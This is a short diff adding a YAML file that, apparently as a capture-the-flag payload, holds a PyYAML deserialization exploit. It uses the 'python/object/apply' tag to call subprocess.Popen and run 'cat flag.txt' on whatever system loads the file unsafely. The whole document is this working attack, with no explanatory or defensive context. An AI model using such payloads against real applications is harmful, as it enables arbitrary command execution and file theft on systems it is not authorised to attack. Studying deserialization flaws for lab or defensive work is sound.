@@ -1,0 +1,4 @@
+!!python/object/apply:subprocess.Popen
+- !!python/tuple
+ - cat
+ - flag.txt
